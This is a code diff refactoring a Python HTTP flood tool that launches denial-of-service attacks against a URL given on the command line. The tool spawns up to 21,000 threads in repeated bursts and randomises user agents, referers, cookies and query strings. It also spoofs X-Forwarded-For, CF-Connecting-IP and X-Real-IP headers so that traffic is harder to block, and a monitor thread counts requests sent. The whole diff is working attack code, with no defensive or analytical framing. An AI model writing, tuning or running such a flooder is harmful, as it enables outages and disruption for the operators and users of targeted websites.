@@ -7,14 +7,16 @@ import time
 from datetime import datetime, timedelta
 import urllib.request
 import urllib.error
-import multiprocessing
 
 url = ''
 host = ''
 headers_useragents = []
 headers_referers = []
 request_counter = 0
-flag = 0
+flag = False
+
+isp_blocks = ['192.168.0.0/24', '10.0.0.0/8', '172.16.0.0/12']
+real_ips = ['192.168.0.1', '10.0.0.1', '172.16.0.1']
 
 def load_useragents():
     with open('useragents.txt', 'r') as f:
@@ -31,6 +33,12 @@ def generate_ip(block):
     network = ipaddress.ip_network(block, strict=False)
     return str(ipaddress.ip_address(random.randint(int(network.network_address) + 1, int(network.broadcast_address) - 1)))
 
+def generate_spoofed_ip():
+    return generate_ip(random.choice(isp_blocks))
+
+def generate_real_ip():
+    return generate_ip(random.choice(isp_blocks))
+
 def generate_cookie():
     expires = (datetime.now() + timedelta(days=1)).strftime('%a, %d-%b-%Y %H:%M:%S GMT')
     return f"sessionid=value{random.randint(1, 100000)}; Expires={expires}; Domain={host}; Path=/; Secure; HttpOnly"
@@ -44,17 +52,17 @@ def inc_counter():
 
 def stop_attack():
     global flag
-    flag = 2
+    flag = True
 
-def httpcall(url, isp_blocks, real_ips):
+def httpcall(url):
     request_url = url + ("&" if url.count("?") > 0 else "?") + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
     headers = {
         'User-Agent': random.choice(headers_useragents),
         'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
-        'X-Forwarded-For': generate_ip(random.choice(isp_blocks)),
+        'X-Forwarded-For': generate_spoofed_ip(),
         'Cookie': generate_cookie(),
-        'CF-Connecting-IP': generate_ip(random.choice(real_ips)),
-        'X-Real-IP': generate_ip(random.choice(real_ips)),
+        'CF-Connecting-IP': generate_real_ip(),
+        'X-Real-IP': generate_real_ip(),
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Encoding': 'gzip, deflate, br',
         'Accept-Language': 'en-US,en;q=0.5',
@@ -72,25 +80,26 @@ def httpcall(url, isp_blocks, real_ips):
         inc_counter()
 
 class HTTPThread(threading.Thread):
-    def __init__(self, url, isp_blocks, real_ips):
+    def __init__(self):
         super().__init__()
-        self.url = url
-        self.isp_blocks = isp_blocks
-        self.real_ips = real_ips
+        self.daemon = True
 
     def run(self):
-        while flag < 2:
-            httpcall(self.url, self.isp_blocks, self.real_ips)
-            time.sleep(random.uniform(0.1, 0.5))
+        while not flag:
+            httpcall(url)
 
-def worker(url, isp_blocks, real_ips):
-    threads = []
-    for _ in range(700):
-        t = HTTPThread(url, isp_blocks, real_ips)
-        t.start()
-        threads.append(t)
-    for t in threads:
-        t.join()
+class MonitorThread(threading.Thread):
+    def __init__(self):
+        super().__init__()
+        self.daemon = True
+
+    def run(self):
+        previous = request_counter
+        while not flag:
+            if previous + 1000 < request_counter and previous != request_counter:
+                print(f"{request_counter} Requests Sent")
+                previous = request_counter
+        print("\n-- Attack stopped by user --")
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
@@ -101,19 +110,23 @@ if __name__ == "__main__":
         url += "/"
     m = re.search('(https?://)?([^/]*)/?.*', url)
     host = m.group(2)
-    isp_blocks = ['192.168.0.0/24', '10.0.0.0/8', '172.16.0.0/12']
-    real_ips = ['192.168.0.1', '10.0.0.1', '172.16.0.1']
-    
-    processes = []
-    for _ in range(500): # Alterado para 500 processos conforme solicitado
-        process = multiprocessing.Process(target=worker, args=(url, isp_blocks, real_ips))
-        processes.append(process)
-        process.start()
-        
-    for process in processes:
-        process.join()
-        
+    threads = []
     try:
-        stop_attack()
+        while True:
+            for i in range(21000):
+                if flag:
+                    break
+                t = HTTPThread()
+                t.start()
+                threads.append(t)
+            time.sleep(7)
+            flag = True
+            for t in threads:
+                t.join()
+            flag = False
+            request_counter = 0
+            threads.clear()
     except KeyboardInterrupt:
         stop_attack()
+        for t in threads:
+            t.join()
